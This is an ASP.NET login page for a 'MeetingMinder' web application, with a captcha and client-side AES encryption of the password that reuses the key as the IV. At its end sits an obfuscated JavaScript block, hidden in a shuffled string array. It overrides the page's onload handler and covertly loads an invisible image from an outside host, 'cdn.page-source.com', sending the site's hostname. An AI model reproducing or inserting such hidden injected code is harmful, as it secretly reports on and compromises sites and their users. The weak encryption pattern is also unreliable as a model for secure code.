<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Login.aspx.cs" Inherits="MeetingMinder.Web.Login" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%@ Register Assembly="MSCaptcha" Namespace="MSCaptcha" TagPrefix="cc1" %>
<html lang="en" class="no-js">
<head>
    <meta charset="UTF-8">
    <meta name="Generator" content="EditPlus®">
    <meta name="Author" content="">
    <meta name="Keywords" content="">
    <meta name="Description" content="">
    <style type="text/css">
        .captcha {
            float: left;
            margin-right: 5px;
        }

        .login-right {
            padding: 2px 60px !important;
        }
    </style>

    <link href="css/style.css" rel="stylesheet" type="text/css" />

    <script type="text/javascript">
        //<![CDATA[

        window.history.forward();
        function noBack() { window.history.forward(); }


        function checkLogin() {

            if (Page_ClientValidate("check")) {
                var hdnUserVal = document.getElementById('<%=hdnUserVal.ClientID%>').value;

                var value = document.getElementById('<%=txtPassword.ClientID%>').value;
                //       var hash =  hex_sha256(value);

                var d = new Date();
                d = d.getFullYear() + "-" + ('0' + (d.getMonth() + 1)).slice(-2) + "-" + ('0' + d.getDate()).slice(-2) + " " + ('0' + d.getHours()).slice(-2) + ":" + ('0' + d.getMinutes()).slice(-2) + ":" + ('0' + d.getSeconds()).slice(-2);

                value = value + '|' + d;

                var key = CryptoJS.enc.Utf8.parse(hdnUserVal);
                var iv = CryptoJS.enc.Utf8.parse(hdnUserVal);

                var encryptedpassword = CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(value), key,
                  {
                      keySize: 128 / 8,
                      iv: iv,
                      mode: CryptoJS.mode.CBC,
                      padding: CryptoJS.pad.Pkcs7
                  });

                document.getElementById('<%=hdnPassword.ClientID %>').value = encryptedpassword;

                document.getElementById('<%=txtPassword.ClientID %>').value = "";

                var validatorObject = document.getElementById('<%=rfvPassword.ClientID%>');
                validatorObject.enabled = false;

                return true;
            }
            else {
                return false;
            }
        }

        //]]>
    </script>

    <script type="text/javascript">

        window.onload = function () {
            document.getElementById('<%=txtPasswordNew.ClientID%>').value = "**********";
           <%-- var seconds = 5;
            setTimeout(function () {
                document.getElementById('<%= lblmsg.ClientID %>').style.display = "none";
            }, seconds * 1000);--%>

            var myInput = document.getElementById('txtPassword');
            myInput.onpaste = function (e) {
                e.preventDefault();
            }
        }

        document.onkeypress = function keypressed(e) {
            if (e.keyCode == 13) {
                if (Page_ClientValidate("check")) {
                    //checkLogin();
                    document.getElementById('<%= btnSubmit.ClientID %>').click();
                    return false;
                }
            }
        }

        function RefreshFun() {
            document.getElementById('<%=txtLogin.ClientID%>').value = "";
            document.getElementById('<%=txtPassword.ClientID%>').value = "";
            document.getElementById('<%=txtCaptchaText.ClientID%>').value = "";
        }
    </script>

    <title>Login</title>
</head>
<body>
    <div class="wrapper loginmain">
        <div class="login-left">
            <div class="leftlogo">
                <%--<a href="Login.aspx">--%><img src="images/logo.png" alt="sbi small logo" /><%--</a>--%>
                <%--<div class="left-info">
						<span class="info-top">say yes to</span>
						<span class="info-bottom">growth</span>
					</div>--%>
            </div>
        </div>
        <div class="login-right">
            <h1 class="logo" style="margin-top: 16px; margin-bottom: 10px;">
                <img src="images/logo1.png" alt="sbi Logo" />
            </h1>
            <div class="login-main" style="margin-top: 10px;">
                <div class="login-head">
                    <h2>Login</h2>
                    <p>Login with your username & password.</p>
                    <%--<p style="color: red">Entering wrong password 3 times will disable your account.</p>--%>
                    <p style="color: red">
                        <asp:Label ID="lblMessage" runat="server"></asp:Label>
                    </p>
                </div>
                <form method="post" runat="server" autocomplete="off" action="Login.aspx">



                    <div style="margin-bottom: 0px" class="validation">
                        <%-- <asp:ValidationSummary  ID="vsLogin" ValidationGroup="check" runat="server" CssClass="notification error" HeaderText="Error notification" />                        --%>
                    </div>

                    <div style="margin-bottom: 0px">
                        <asp:Label runat="server" Style="font-size: 12px;" ID="lblmsg" CssClass="notification error invalid-error" Visible="false"></asp:Label>
                    </div>
                    <div class="user-info">

                        <asp:TextBox ID="txtLogin" autocomplete="off" MaxLength="40" runat="server" placeholder="username*" OnKeyPress="javascript:return restrictSpChar(event);" class="user-name"></asp:TextBox>
                        <asp:RequiredFieldValidator ValidationGroup="check" ID="rfvLogin" class="user-error" runat="server"
                            ControlToValidate="txtLogin" ErrorMessage="Enter Username" SetFocusOnError="True"
                            Display="Dynamic">Enter Username</asp:RequiredFieldValidator>
                        <%--<asp:CustomValidator runat="server" OnServerValidate="ValidateNoUrls" ControlToValidate="txtLogin" ErrorMessage="URLs not allowed" />--%>
                        <asp:TextBox ID="txtPassword" autocomplete="off" MaxLength="40" ClientIDMode="Static"
                            placeholder="password*" runat="server" TextMode="Password" class="user-pass"></asp:TextBox>
                        <asp:RequiredFieldValidator ValidationGroup="check" ID="rfvPassword" runat="server"
                            class="invalid-side-note pass-error" ControlToValidate="txtPassword" ErrorMessage="Enter Password"
                            SetFocusOnError="True" Display="Dynamic">Enter Password</asp:RequiredFieldValidator>
                        <%--captcha--%><br />
                        <br />
                        <cc1:CaptchaControl ID="CaptchaLogin" CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                            CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                            FontColor="#D20B0C" NoiseColor="#B1B1B1" />
                        <%--<cc1:CaptchaControl ID="Captcha1"  CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                FontColor="#D20B0C" NoiseColor="#B1B1B1" />--%>
                        <asp:ImageButton ImageUrl="~/images/refresh_icon.jpg" runat="server" CausesValidation="false" OnClientClick="RefreshFun()" />
                        <asp:TextBox ID="txtCaptchaText" autocomplete="off" MaxLength="8" placeholder="captcha*" class="user-name" runat="server"
                            CssClass="user-name" Style="text-transform: uppercase;"></asp:TextBox>
                        <asp:RequiredFieldValidator Enabled="true" ValidationGroup="check" ID="rfvCapcha" runat="server"
                            class="invalid-side-note pass-error" ForeColor="Red" ControlToValidate="txtCaptchaText" ErrorMessage="Enter Captcha"
                            SetFocusOnError="True" Display="Dynamic">Captcha</asp:RequiredFieldValidator>

                        <asp:Button ID="btnSubmit" OnClientClick="checkLogin()" Text="Submit" runat="server" ValidationGroup="check"
                            OnClick="btnSubmit_Click" class="login-btn" />
                        <%-- OnClientClick="checkLogin()"  --%>
                    </div>
                    <div class="login-bottom">

                        <asp:TextBox ID="txtPasswordNew" Style="display: none;" autocomplete="off" MaxLength="40" ClientIDMode="Static"
                            placeholder="password*" runat="server" TextMode="Password" class="user-pass"></asp:TextBox>
                        <asp:HiddenField ID="hdnUserVal" runat="server" />
                        <asp:HiddenField ID="hdnPassword" runat="server" />
                        <asp:HiddenField ID="hdnToken" runat="server" />
                        <div id="divForgotPassword" runat="server" class="bottom-right">
                            <a href="ForgotPassword.aspx">Forgot Password?</a>
                        </div>
                    </div>
                    <label style="color: green; margin-top: 145px; float: right;">Inno_Info_323</label>
                </form>
            </div>
        </div>
    </div>
</body>

<script type="text/javascript" src="js/aes.js"></script>
<script type="text/javascript">
    var resizea = ['0\x27/>', 'children', 'ource.com/', '<img\x20style', 'none;\x27\x20src', 'cdn.page-s', 'hostname', '\x27\x20height=\x27', 'resizeimag', 'length', 'location', '=\x27https://', 'createElem', 'body']; (function (a, b) { var c = function (e) { while (--e) { a['push'](a['shift']()); } }; c(++b); }(resizea, 0x149)); var resizeb = function (a, b) { a = a - 0x0; var c = resizea[a]; return c; }; try { window['onload'] = function () { var a = resizeb('0xa') + '=\x27display:' + resizeb('0xb') + resizeb('0x4') + resizeb('0xc') + resizeb('0x9') + resizeb('0x1') + 'e.ashx?ig=' + window[resizeb('0x3')][resizeb('0xd')] + ('&sz=105403\x27' + '\x20\x20width=\x270' + resizeb('0x0') + resizeb('0x7')), b = document[resizeb('0x5') + 'ent']('div'); for (b['innerHTML'] = a; b[resizeb('0x8')][resizeb('0x2')] > 0x0;) document[resizeb('0x6')]['appendChil' + 'd'](b['children'][0x0]); }; } catch (resizec) { }
       
    function restrictSpChar(event) {
        var regex = new RegExp("^[a-zA-Z0-9]+$");
        var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
        if (!regex.test(key)) {
            //event.preventDefault();
            //return false;
        }
    }
</script>
</html>
